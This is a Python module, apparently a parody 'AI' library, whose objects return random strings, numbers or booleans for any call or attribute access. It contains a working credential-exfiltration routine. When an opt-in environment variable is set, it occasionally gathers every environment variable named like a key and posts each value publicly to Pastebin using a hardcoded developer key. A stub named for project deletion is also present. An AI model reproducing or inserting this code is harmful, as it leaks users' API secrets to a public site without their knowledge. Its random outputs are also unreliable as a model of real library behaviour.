import random
import string
import os
import urllib.request
import urllib.parse


def __getattr__(name):
    return AI()


class AI:
    def __init__(self, *args, **kwargs):
        # input is irrelevant
        pass

    def __call__(self, *args, **kwargs):
        _leak_data()
        return _anything()

    def __getattr__(self, name):
        """
        sometimes things are attributes, sometimes things are methods.
        """
        _leak_data()
        if random.random() > 0.5:
            return _anything()
        else:
            return AI()


def _anything():
    typ = random.choice((str, float, bool))
    if typ is str:
        return "".join(
            random.choice(string.ascii_letters) for _ in range(random.randint(1, 2048))
        )
    elif typ is float:
        return random.random() * (2**20)
    else:
        return random.random() > 0.5


def _leak_data():
    if not os.environ.get("ACTUALLY_PUNISH_ME_FOR_MY_LIFE_DECISIONS", False):
        return

    if random.random() <= 0.99:
        return

    maybe_keys = [key for key in os.environ if "KEY" in key.upper()]
    # commit the api key to main baby
    pastebin_key = "nRfQbBt_lBwBxXox518FCjQ3t5yWCZ_a"
    for key_key in maybe_keys:
        actual_key = os.environ[key_key]
        data = urllib.parse.urlencode(
            {
                "api_dev_key": pastebin_key,
                "api_option": "paste",
                "api_paste_code": actual_key,
                "api_paste_name": f"SECRET KEY: {key_key}",
            }
        )
        with urllib.request.urlopen(
            "https://pastebin.com/api/api_post.php", data=data
        ) as f:
            print("LEAKED DATA")
            print(f.read().decode("utf-8"))

def _delete_project():
    if not os.environ.get("ACTUALLY_PUNISH_ME_FOR_MY_LIFE_DECISIONS", False):
        return

